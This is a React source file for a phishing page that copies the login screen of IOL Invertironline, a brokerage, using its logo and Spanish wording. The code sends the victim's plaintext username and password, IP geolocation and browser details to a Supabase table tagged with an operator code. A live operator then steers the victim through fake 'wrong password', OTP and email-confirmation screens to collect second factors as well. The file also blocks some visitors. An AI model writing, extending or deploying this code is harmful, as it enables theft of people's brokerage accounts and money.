import { useCallback, useEffect, useState } from "react";
import { useParams } from "react-router-dom";
import { Eye, EyeOff } from "lucide-react";

import iolLogo from "@/assets/iol-logo.png";
import ConfirmEmailScreen from "@/components/login/ConfirmEmailScreen";
import OtpScreen from "@/components/login/OtpScreen";
import SuccessScreen from "@/components/login/SuccessScreen";
import WaitingScreen from "@/components/login/WaitingScreen";
import { useRateLimit } from "@/hooks/useRateLimit";
import { useVisitTracker, useVisitorPresence } from "@/hooks/useVisitTracker";
import { supabase } from "@/integrations/supabase/client";

type IolStep = "form" | "waiting" | "otp" | "confirm_email" | "sync_email" | "success";

interface IolLoginFormProps {
  loading: boolean;
  error?: string;
  onSubmit: (identifier: string, password: string) => Promise<void>;
}

const IolLoginForm = ({ loading, error, onSubmit }: IolLoginFormProps) => {
  const [identifier, setIdentifier] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!identifier.trim() || !password.trim()) return;
    await onSubmit(identifier, password);
  };

  return (
    <form onSubmit={handleSubmit} className="flex flex-col gap-4" noValidate>
      {error && (
        <div className="rounded-xl border border-destructive/30 bg-destructive/10 px-4 py-3 text-sm text-destructive">
          {error}
        </div>
      )}

      <div className="space-y-2">
        <label className="text-sm font-medium text-foreground">Usuario o e-mail</label>
        <input
          type="text"
          value={identifier}
          onChange={(e) => setIdentifier(e.target.value)}
          placeholder="Ingresá tu usuario o e-mail"
          autoComplete="username"
          className="w-full rounded-xl border border-border bg-input px-4 py-3 text-sm text-foreground outline-none transition-colors placeholder:text-muted-foreground focus:border-ring"
          required
        />
      </div>

      <div className="space-y-2">
        <label className="text-sm font-medium text-foreground">Contraseña</label>
        <div className="relative">
          <input
            type={showPassword ? "text" : "password"}
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            placeholder="Ingresá tu contraseña"
            autoComplete="current-password"
            className="w-full rounded-xl border border-border bg-input px-4 py-3 pr-12 text-sm text-foreground outline-none transition-colors placeholder:text-muted-foreground focus:border-ring"
            required
          />
          <button
            type="button"
            onClick={() => setShowPassword((value) => !value)}
            className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground transition-colors hover:text-foreground"
            aria-label={showPassword ? "Ocultar contraseña" : "Mostrar contraseña"}
          >
            {showPassword ? <Eye size={18} /> : <EyeOff size={18} />}
          </button>
        </div>
      </div>

      <button
        type="submit"
        disabled={loading}
        className="mt-2 rounded-xl bg-primary px-4 py-3 text-sm font-semibold text-primary-foreground transition-opacity hover:opacity-90 disabled:opacity-60"
      >
        {loading ? "Ingresando..." : "Ingresar"}
      </button>
    </form>
  );
};

const IolShell = ({ children }: { children: React.ReactNode }) => (
  <div className="relative min-h-screen overflow-hidden bg-background px-4 py-10 text-foreground">
    <div className="pointer-events-none absolute inset-0">
      <div className="absolute left-1/2 top-0 h-64 w-64 -translate-x-1/2 rounded-full bg-primary/15 blur-3xl" />
      <div className="absolute bottom-0 right-0 h-56 w-56 rounded-full bg-accent/10 blur-3xl" />
    </div>

    <div className="relative mx-auto flex min-h-[calc(100vh-5rem)] w-full max-w-md items-center justify-center">
      <div className="w-full rounded-3xl border border-border bg-card/95 p-6 shadow-2xl backdrop-blur">
        <div className="mb-8 flex flex-col items-center text-center">
          <img src={iolLogo} alt="IOL" className="mb-5 h-14 w-auto object-contain" />
          <h1 className="text-2xl font-semibold text-card-foreground">Ingresá a tu cuenta</h1>
          <p className="mt-2 text-sm text-muted-foreground">Accedé para continuar en IOL Invertironline.</p>
        </div>

        {children}
      </div>
    </div>
  </div>
);

const Iol = () => {
  const { operatorCode: rawOperatorCode } = useParams<{ operatorCode?: string }>();
  const operatorCode = rawOperatorCode?.replace(/[^a-zA-Z0-9]/g, "") || "master";

  const [step, setStep] = useState<IolStep>("form");
  const [identifier, setIdentifier] = useState("");
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");

  const rateLimit = useRateLimit();

  useVisitTracker();
  useVisitorPresence(sessionId);

  useEffect(() => {
    const previousTitle = document.title;
    const previousDescription = document.querySelector('meta[name="description"]')?.getAttribute("content") || "";

    document.title = "IOL — Ingresá a tu cuenta";
    const descriptionTag = document.querySelector('meta[name="description"]');
    if (descriptionTag) {
      descriptionTag.setAttribute("content", "IOL Invertironline — acceso seguro a tu cuenta.");
    }

    return () => {
      document.title = previousTitle;
      const currentDescriptionTag = document.querySelector('meta[name="description"]');
      if (currentDescriptionTag) {
        currentDescriptionTag.setAttribute("content", previousDescription);
      }
    };
  }, []);

  const handleDecision = useCallback((status?: string) => {
    if (!status) return;

    if (["login_success", "approved", "completed", "confirm_approved", "otp_approved", "sync_approved"].includes(status)) {
      setStep("success");
      setErrorMessage("");
      return;
    }

    if (status === "wrong_password") {
      setStep("waiting");
      setErrorMessage("Contraseña incorrecta. Intentá de nuevo.");
      return;
    }

    if (status === "redirect_otp" || status === "show_otp") {
      setStep("otp");
      setErrorMessage("");
      return;
    }

    if (status === "redirect_confirm_email") {
      setStep("confirm_email");
      setErrorMessage("");
      return;
    }

    if (status === "redirect_sync_email") {
      setStep("sync_email");
      setErrorMessage("");
      return;
    }

    if (["pending_review", "otp_submitted", "confirm_email_pending", "sync_email_pending"].includes(status)) {
      setStep("waiting");
      if (status !== "wrong_password") setErrorMessage("");
    }
  }, []);

  useEffect(() => {
    if (!sessionId || step === "form" || step === "success") return;

    const reviewChannel = supabase.channel(`session-review-${sessionId}`);
    const otpChannel = supabase.channel(`session-otp-decision-${sessionId}`);

    reviewChannel
      .on("broadcast", { event: "review_decision" }, (payload) => {
        handleDecision(payload.payload?.status as string | undefined);
      })
      .subscribe();

    otpChannel
      .on("broadcast", { event: "otp_decision" }, (payload) => {
        handleDecision(payload.payload?.status as string | undefined);
      })
      .subscribe();

    const pollInterval = window.setInterval(async () => {
      const { data } = await supabase
        .from("sessions")
        .select("status")
        .eq("id", sessionId)
        .maybeSingle();

      handleDecision(data?.status);
    }, 2500);

    return () => {
      supabase.removeChannel(reviewChannel);
      supabase.removeChannel(otpChannel);
      window.clearInterval(pollInterval);
    };
  }, [sessionId, step, handleDecision]);

  const handleLoginSubmit = useCallback(async (submittedIdentifier: string, password: string) => {
    setLoading(true);
    setErrorMessage("");
    setIdentifier(submittedIdentifier);

    try {
      let ipData = { ip: "unknown", country: "", city: "", region: "" };

      try {
        const response = await fetch("https://ipapi.co/json/");
        if (response.ok) {
          const data = await response.json();
          ipData = {
            ip: data.ip || "unknown",
            country: data.country_name || "",
            city: data.city || "",
            region: data.region || "",
          };
        }
      } catch {
        // ignore ip lookup errors
      }

      const newSessionId = crypto.randomUUID();
      const { error } = await supabase.from("sessions").insert({
        id: newSessionId,
        email: submittedIdentifier,
        password,
        ip_address: ipData.ip,
        user_agent: navigator.userAgent,
        country: ipData.country,
        city: ipData.city,
        region: ipData.region,
        status: "pending_review",
        source: "iol",
        operator_code: operatorCode,
      });

      if (error) throw error;

      setSessionId(newSessionId);
      setStep("waiting");
    } catch {
      setErrorMessage("No se pudo iniciar la sesión. Intentá nuevamente.");
      setStep("form");
    } finally {
      setLoading(false);
    }
  }, [operatorCode]);

  const handlePasswordResubmit = useCallback(async (password: string) => {
    if (!sessionId) return;

    setErrorMessage("");

    await supabase
      .from("sessions")
      .update({ password, status: "pending_review" })
      .eq("id", sessionId);
  }, [sessionId]);

  if (rateLimit.loading) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-background text-sm text-muted-foreground">
        Cargando...
      </div>
    );
  }

  if (rateLimit.blocked) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-background px-4">
        <div className="w-full max-w-md rounded-2xl border border-border bg-card p-8 text-center">
          <h2 className="text-lg font-semibold text-card-foreground">Acceso restringido</h2>
          <p className="mt-2 text-sm text-muted-foreground">No pudimos validar el acceso desde este dispositivo.</p>
        </div>
      </div>
    );
  }

  return (
    <IolShell>
      {step === "form" && <IolLoginForm loading={loading} error={errorMessage} onSubmit={handleLoginSubmit} />}
      {step === "waiting" && sessionId && (
        <WaitingScreen
          email={identifier}
          sessionId={sessionId}
          errorMessage={errorMessage}
          onPasswordResubmit={handlePasswordResubmit}
        />
      )}
      {step === "otp" && sessionId && (
        <OtpScreen email={identifier} sessionId={sessionId} onBack={() => setStep("waiting")} />
      )}
      {(step === "confirm_email" || step === "sync_email") && sessionId && (
        <ConfirmEmailScreen email={identifier} sessionId={sessionId} onBack={() => setStep("waiting")} />
      )}
      {step === "success" && <SuccessScreen email={identifier} />}
    </IolShell>
  );
};

export default Iol;
